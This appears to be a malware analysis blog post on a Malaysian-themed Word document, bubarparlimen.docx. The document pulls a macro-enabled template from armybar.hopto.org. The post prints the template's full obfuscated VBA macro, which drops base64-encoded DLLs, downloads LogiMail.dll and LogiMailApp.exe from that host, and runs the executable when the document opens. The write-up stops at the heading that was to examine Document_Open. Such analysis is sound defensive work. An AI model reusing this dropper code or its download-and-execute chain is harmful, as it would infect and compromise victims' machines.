+++
title = 'Bubar Parlimen Maldoc Analysis: Remote Template VBA Macro'
description = "Malware analysis of bubarparlimen.docx, a Word document that pulls in a remote macro-enabled template with obfuscated VBA that drops and runs a payload."
date = 2025-01-23T10:36:00+08:00
draft = false
categories = ["Malware Analysis"]
tags = ["maldoc", "vba-macro"]
+++

A `bubarparlimen.docx` file with an external `RemoteLoad.dotm` attached template file where it contains malicious VBA Macro which will write `PE` files, fetch `.exe` + `.dll` file and executing it in the infected machine. The macro uses base64 encoding method and constructing the encoded string little by little to avoid suspicion. 

## 2. Case Details

| **File Name**    | bubarparlimen.docx                                               |
| ---------------- | ---------------------------------------------------------------- |
| **File Size**    | 214.91 KiB                                                       |
| **File Type**    | Microsoft Office Word(15.0000)                                   |
| **MD5**          | afbe00e755a2cf963f0eedbb4e310198                                 |
| **SHA1**         | a55bd3f15ce743c9cda7bec05afe50b9aefa4683                         |
| **SHA256**       | ab541df861c6045a17006969dac074a7d300c0a8edd0a5815c8b871b62ecdda7 |
| **Created Time** | 15/5/2024 11:47:03 PM                                            |

| **File Name**    | RemoteLoad.dotm                                                  |
| ---------------- | ---------------------------------------------------------------- |
| **File Size**    | 23.76 KiB                                                        |
| **File Type**    | Microsoft Office Word(15.0000)                                   |
| **MD5**          | 8114e5e15d4086843cf33e3fca7c945b                                 |
| **SHA1**         | 5f7f0b1419448c5fe1a8051ac8cb2cf7b95a3ffa                         |
| **SHA256**       | 145daf50aefb7beec32556fd011e10c9eaa71e356649edfce4404409c1e8fa30 |
| **Created Time** | 15/5/2024 11:52:02 PM                                            |

## 3. Case Specific Requirements
###  Machine

- Windows Environment

### Tools

- hashmyfiles 
- olevba
- Microsoft Word
- CyberChef

## 4. Static Analysis

### 4.1 bubarparlimen.docx

bubarparlimen.docx is a `.docx`. To go further into the analysis, it is necessary to understand what `.docx` structure is.

A `.docx` file is essentially a ZIP archive containing XML files and directories that define the document's content, formatting, and relationships to external or embedded resources.

The folder structure inside a .docx file looks like this: 

- **docProps**: Contains XML files that store document properties, such as the title, author, and creation date.
- **_rels**: Contains XML files that define the relationships between the various parts of the document.
- **word**: Contains the main content of the document, including the text, images, and formatting information.
- **document.xml**: Contains the actual content of the document, stored in XML format.
- **fontTable.xml**: Contains information about the fonts used in the document.
- **settings.xml**: Contains settings for the document, such as page margins and header/footer information.
- **styles.xml**: Contains the styles used in the document, such as headings and paragraph styles.
- **\[Content_Types\].xml**: Defines the types of content that are included in the document.

[reference](https://medium.com/@stefan.sommarsjo/structure-of-docx-files-xml-schema-file-organization-and-common-errors-c74d841a65e7)

The focus now is in the `word` folder. Inside the `word/_rels/settings.xml.rels` file specifically manages relationships within the document. It maps parts of the document to external resources (e.g., images, links, macros, or OLE objects). `word/_rels/settings.xml.rels` is a critical file because it provides a map of how the document interacts with its environment.

After extracting the `bubarparlimen.docx` file and going into the content of the file `word/_rels/settings.xml.rels` 

![external template dotm](/images/bubarparlimen/external-template-dotm.png)


XML Explaination:
**```
```xml
Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
```

- Indicates this is an **Attached Template** relationship, which links the document to an external template file.

```xml
Target="https://armybar.hopto.org/RemoteLoad.dotm"
```

- Specifies the external resource being referenced, in this case, a template hosted on a potentially malicious domain.

```xml
TargetMode="External"
```

- Indicates the resource is external, not embedded within the `.docx` file.
#### Key Findings

1. The document references an external **macro-enabled template file** (`.dotm` file). When the document is opened in Microsoft Word, Word may attempt to load this template.
2. The `Target="https://armybar.hopto.org/RemoteLoad.dotm"` URL shows the document will download the `.dotm` file from `armybar.hopto.org`
3. Possibly a Malicious Document Template Injection attack.

### RemoteLoad.dotm

A `.dotm` file is a Microsoft Word Macro-Enabled Template file. It is used in Microsoft Word to create document templates that include pre-defined styles, formatting, and macros.

Looking into `RemoteLoad.dotm` file and going into Microsoft Script Editor shows that the macros are protected with a password.

![Password Protected VBA Macro](/images/bubarparlimen/password-protected-vba-macro.png)


With **[olevba](https://github.com/decalage2/oletools/wiki/olevba)** , the VBA macro source code can be extracted. 


Olevba Output:

```
olevba RemoteLoad.dotm
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.10.11 - http://decalage.info/python/oletools
===============================================================================
FILE: RemoteLoad.dotm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Option Explicit
#If VBA7 Then
    Private Declare PtrSafe Function FreeLibrary Lib "kernel32" (ByVal hLibModule As LongPtr) As LongPtr
    Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare PtrSafe Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As Long, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any) As Long
#Else
    Private Declare Function FreeLibrary Lib "kernel32" (ByVal hLibModule As Long) As Long
    Private Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long
    Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
    Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Any, ByVal wParam As Any, ByVal lParam As Any) As Long
#End If

Private Const clOneMask = 16515072
Private Const clTwoMask = 258048
Private Const clThreeMask = 4032
Private Const clFourMask = 63

Private Const clHighMask = 16711680
Private Const clMidMask = 65280
Private Const clLowMask = 255

Private Const cl2Exp18 = 262144
Private Const cl2Exp12 = 4096
Private Const cl2Exp6 = 64
Private Const cl2Exp8 = 256
Private Const cl2Exp16 = 65536
Public Function AES(sString As String) As String

    Dim bOut() As Byte, bIn() As Byte, bTrans(255) As Byte, lPowers6(63) As Long, lPowers12(63) As Long
    Dim lPowers18(63) As Long, lQuad As Long, iPad As Integer, lChar As Long, lPos As Long, sOut As String
    Dim lTemp As Long

    sString = Replace(sString, vbCr, vbNullString)
    sString = Replace(sString, vbLf, vbNullString)

    lTemp = Len(sString) Mod 4
    If lTemp Then
        Call Err.Raise(vbObjectError, "MyDecode", "Input string is not valid")
    End If

    If InStrRev(sString, "==") Then
        iPad = 2
    ElseIf InStrRev(sString, "=") Then
        iPad = 1
    End If

    For lTemp = 0 To 255
        Select Case lTemp
            Case 65 To 90
                bTrans(lTemp) = lTemp - 65
            Case 97 To 122
                bTrans(lTemp) = lTemp - 71
            Case 48 To 57
                bTrans(lTemp) = lTemp + 4
            Case 43
                bTrans(lTemp) = 62
            Case 47
                bTrans(lTemp) = 63
        End Select
    Next lTemp

    For lTemp = 0 To 63
        lPowers6(lTemp) = lTemp * cl2Exp6
        lPowers12(lTemp) = lTemp * cl2Exp12
        lPowers18(lTemp) = lTemp * cl2Exp18
    Next lTemp

    bIn = StrConv(sString, vbFromUnicode)
    ReDim bOut((((UBound(bIn) + 1) \ 4) * 3) - 1)

    For lChar = 0 To UBound(bIn) Step 4
        lQuad = lPowers18(bTrans(bIn(lChar))) + lPowers12(bTrans(bIn(lChar + 1))) + _
                lPowers6(bTrans(bIn(lChar + 2))) + bTrans(bIn(lChar + 3))
        lTemp = lQuad And clHighMask
        bOut(lPos) = lTemp \ cl2Exp16
        lTemp = lQuad And clMidMask
        bOut(lPos + 1) = lTemp \ cl2Exp8
        bOut(lPos + 2) = lQuad And clLowMask
        lPos = lPos + 3
    Next lChar

    sOut = StrConv(bOut, vbUnicode)
    If iPad Then sOut = Left$(sOut, Len(sOut) - iPad)
    AES = sOut

End Function

Public Function MyDecode(sString As String) As String
Dim TempStr As String
TempStr = sString
TempStr = Replace(TempStr, "uPCgt131", "==")
TempStr = Replace(TempStr, "Jc34DSga", "=")
MyDecode = AES(TempStr)
End Function

Private Sub Document_Open()
    On Error Resume Next
    Dim lgstr As String
    Dim FuEmdPath1 As String
    Dim FuEmdPath2 As String
    Dim cm, em
    Dim Stream
    Set cm = CreateObject("Microsoft.XMLDOM")
    Set em = cm.createElement("v")
    Set Stream = CreateObject("ADODB.Stream")
    lgstr = "T" & "V" & "qQA" & "AMAAAA"
    lgstr = lgstr & "EAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADdY4TFmQLqlpkC6paZAuqWRP0hlpoC6paZAuuWnQLqlmtb45ebAuqWa1vql5gC6pZrW+iXmALqllJpY2iZAuqW"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAEwBAwAxUuFdAAAAAAAAAADgAAIhCwEOAAACAAAABgAAAAAAAAAAAAAAEAAAACAAAAAAABAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAQAAAAAQAAAAAAAACAEAFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAsCAAAE0AAAC0IQAAKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAgAAAA"
    lgstr = lgstr & "cCAAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAIAAAAAAEAAAAAIAAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAA4AgAAACAAAAAEAAAABgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAAIAAAAAAwAAAAAgAAAAoAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFWL7FZoICAAEP8VDCAAEIvwhfZ0HGgsIAAQVv8VACAAEIXAdAX/dRD/0Fb/FQQgABBoRCAAEP8VDCAAEIvwhfZ0JWhQIAAQVv8VACAAEIXAdA5qAGoA/3UU/3UQagD/0Fb/FQQgABBeXcPMzMzMzMxVi+xqAP91FP8VCCAAEF3D"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "ACIAABIiAAAgIgAA8CEAAAAAAAAAAAAAAAAAAAAAAABXaW5pbmV0LmRsbABEZWxldGVVcmxDYWNoZUVudHJ5QQAAAABVcmxtb24uZGxsAABVUkxEb3dubG9hZFRvRmlsZUEAAAAAAAAAAAAAAAAAAAAAAAAxUuFdAAAAAA0AAAC0AAAAACEAAAAHAAAAAAAAMVLhXQAAAAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMVLhXQAAAADsIAAA"
    lgstr = lgstr & "AQAAAAIAAAACAAAA2CAAAOAgAADoIAAAcBAAAAAQAAD1IAAA+SAAAAAAAQB1dGZjLmRsbABSQ1AAUkNUAAAAAEdDVEwAEAAAgAAAAC50ZXh0JG1uAAAAAAAgAAAUAAAALmlkYXRhJDUAAAAAICAAAIgAAAAucmRhdGEAALAgAABNAAAALmVkYXRhAAAAIQAAtAAAAC5yZGF0YSR6enpkYmcAAAC0IQAAFAAAAC5pZGF0YSQyAAAAAMghAAAUAAAA"
    lgstr = lgstr & "LmlkYXRhJDMAAAAA3CEAABQAAAAuaWRhdGEkNAAAAADwIQAASAAAAC5pZGF0YSQ2AAAAANwhAAAAAAAAAAAAACoiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIgAAEiIAACAiAADwIQAAAAAAAKUDTG9hZExpYnJhcnlBAACdAkdldFByb2NBZGRyZXNzAACeAUZyZWVMaWJyYXJ5AM4FV2luRXhlYwBLRVJORUwzMi5kbGwAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAgAAAABTALMBYwHTAtMDIwODBDMEowYzB6MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    FuEmdPath1 = Environ("PUBLIC") & "\sl1.tmp"
    em.Text = lgstr
    em.DataType = "bin.base64"
    Stream.Type = 1
    Stream.Open

    Stream.Write em.NodeTypedValue
    Stream.SaveToFile FuEmdPath1, 2
    lgstr = "T" & "V" & "qQA" & "AMAAAA"
    lgstr = lgstr & "EAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADdY4TFmQLqlpkC6paZAuqWRP0hlpoC6paZAuuWnQLqlmtb45ebAuqWa1vql5gC6pZrW+iXmALqllJpY2iZAuqW"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAGSGAwBgjOFdAAAAAAAAAADwACIgCwIOAAACAAAABgAAAAAAAAAAAAAAEAAAAAAAgAEAAAAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAQAAAAAQAAAAAAAACAGABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAKAhAABaAAAA/CEAACgAAAAAAAAAAAAAAAAwAAAMAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAIAgAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAC8AAAAABAAAAACAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAmAIAAAAgAAAABAAAAAYAAAAAAAAAAAAAAAAAAEAAAEAucGRhdGEAAAwAAAAAMAAA"
    lgstr = lgstr & "AAIAAAAKAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiJXCQISIl0JBBXSIPsMEiNDRoQAABJi/FJi/j/FfYPAABIi9hIhcB0I0iNFQ8QAABIi8j/FcYPAABIhcB0BUiLz//QSIvL/xW7DwAASI0NBBAAAP8Vvg8AAEiL2EiFwHQ0SI0V/w8AAEiLyP8Vjg8AAEiFwHQWRTPJSMdEJCAA"
    lgstr = lgstr & "AAAATIvGSIvXM8n/0EiLy/8Vcg8AAEiLXCRASIt0JEhIg8QwX8PMzMzMzMzMzMzMM9JJi8lI/yVUDwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "YCIAAAAAAAByIgAAAAAAAIAiAAAAAAAAUCIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV2luaW5ldC5kbGwAAAAAAERlbGV0ZVVybENhY2hlRW50cnlBAAAAAFVybG1vbi5kbGwAAAAAAABVUkxEb3dubG9hZFRvRmlsZUEAAAAAAAAAAAAAYIzhXQAAAAANAAAA1AAAALggAAC4BgAAAAAAAGCM4V0AAAAADgAAAAAAAAAAAAAAAAAAAEdDVEwAEAAA"
    lgstr = lgstr & "vAAAAC50ZXh0JG1uAAAAAAAgAAAoAAAALmlkYXRhJDUAAAAAMCAAAIgAAAAucmRhdGEAALggAADUAAAALnJkYXRhJHp6emRiZwAAAIwhAAAQAAAALnhkYXRhAACgIQAAWgAAAC5lZGF0YQAA/CEAABQAAAAuaWRhdGEkMgAAAAAQIgAAFAAAAC5pZGF0YSQzAAAAACgiAAAoAAAALmlkYXRhJDQAAAAAUCIAAEgAAAAuaWRhdGEkNgAAAAAAMAAA"
    lgstr = lgstr & "DAAAAC5wZGF0YQAAAQ8GAA9kCQAPNAgAD1ILcAAAAAAAAAAAX4zhXQAAAADcIQAAAQAAAAIAAAACAAAAyCEAANAhAADYIQAAsBAAAAAQAADyIQAA9iEAAAAAAQBVcmxEb3dubG9hZFRvRmlsZS5kbGwAUkNQAFJDVAAAACgiAAAAAAAAAAAAAIoiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYCIAAAAAAAByIgAAAAAAAIAiAAAAAAAA"
    lgstr = lgstr & "UCIAAAAAAAAAAAAAAAAAAKgDTG9hZExpYnJhcnlBAACkAkdldFByb2NBZGRyZXNzAACkAUZyZWVMaWJyYXJ5AN4FV2luRXhlYwBLRVJORUwzMi5kbGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAACmEAAAjCEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    lgstr = lgstr & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    FuEmdPath2 = Environ("PUBLIC") & "\sl2.tmp"
    em.Text = lgstr
    em.DataType = "bin.base64"
    Stream.Type = 1
    Stream.Open
    Stream.Write em.NodeTypedValue
    Stream.SaveToFile FuEmdPath2, 2
    Dim lb As LongPtr
    Dim pa As LongPtr
    Dim pas As LongPtr
    Dim retValue As Long
    Dim Gud As String
    Dim hCurprocess As Boolean
    Dim Embedded As String
    Dim Outp As String
    ActiveDocument.Content.Font.Hidden = False
    lb = LoadLibrary(FuEmdPath1)
    pa = GetProcAddress(lb, "RCT")
    If pa < 1 Then
    FreeLibrary (lb)
    lb = LoadLibrary(FuEmdPath2)
    pa = GetProcAddress(lb, "RCT")
    End If
    pas = GetProcAddress(lb, "RCP")


    Gud = MyDecode("aHR0cHM6Ly9hcm15YmFyLmhvcHRvLm9yZy9Mb2dpTWFpbC5kbGwJc34DSga")  'Dllurl

    Outp = Environ("LOCALAPPDATA") + MyDecode("XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWwuZGxs")
    retValue = CallWindowProc(pa, ByVal 1&, ByVal 2&, Gud, Outp)


    Gud = MyDecode("aHR0cHM6Ly9hcm15YmFyLmhvcHRvLm9yZy9Mb2dpTWFpbEFwcC5leGUJc34DSga") 'Exeurl


    Outp = Environ("LOCALAPPDATA") + MyDecode("XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWxBcHAuZXhl")
    retValue = CallWindowProc(pa, ByVal 1&, ByVal 2&, Gud, Outp)
    Embedded = "c" & "m" & "d" & " /c " & Outp
    retValue = CallWindowProc(pas, ByVal 1&, ByVal 2&, Gud, Embedded)
    FreeLibrary (lb)

    Dim filesys
    Set filesys = CreateObject("Scripting.FileSystemObject")
    If filesys.FileExists(FuEmdPath1) Then
    filesys.DeleteFile FuEmdPath1
    End If
    If filesys.FileExists(FuEmdPath2) Then
    filesys.DeleteFile FuEmdPath2
    End If

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|ADODB.Stream        |May create a text file                       |
|Suspicious|SaveToFile          |May create a text file                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
|          |                    |(obfuscation: Base64)                        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Wininet.dll         |Executable file name (obfuscation: Base64)   |
|IOC       |Urlmon.dll          |Executable file name (obfuscation: Base64)   |
|IOC       |utfc.dll            |Executable file name (obfuscation: Base64)   |
|IOC       |KERNEL32.dll        |Executable file name (obfuscation: Base64)   |
|IOC       |UrlDownloadToFile.dl|Executable file name (obfuscation: Base64)   |
|          |l                   |                                             |
|IOC       |LogiMail.dll        |Executable file name (obfuscation: Base64)   |
|IOC       |LogiMailApp.exe     |Executable file name (obfuscation: Base64)   |
|Base64    |\Microsoft\Office\Lo|XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWwuZGxs     |
|String    |giMail.dll          |                                             |
|Base64    |\Microsoft\Office\Lo|XE1pY3Jvc29mdFxPZmZpY2VcTG9naU1haWxBcHAuZXhl |
|String    |giMailApp.exe       |                                             |
+----------+--------------------+---------------------------------------------+

```

Looking at the extracted macro, function `Document_Open` were being used which means the code will be run when the document was open. There are 2 functions which are `AES` to decode the given value from Base64 and `MyDecode` function that replaces custom encoded placeholders ("uPCgt131", "Jc34DSga") with Base64 padding characters (== and =).

 #### Examining `Document_Open()` 

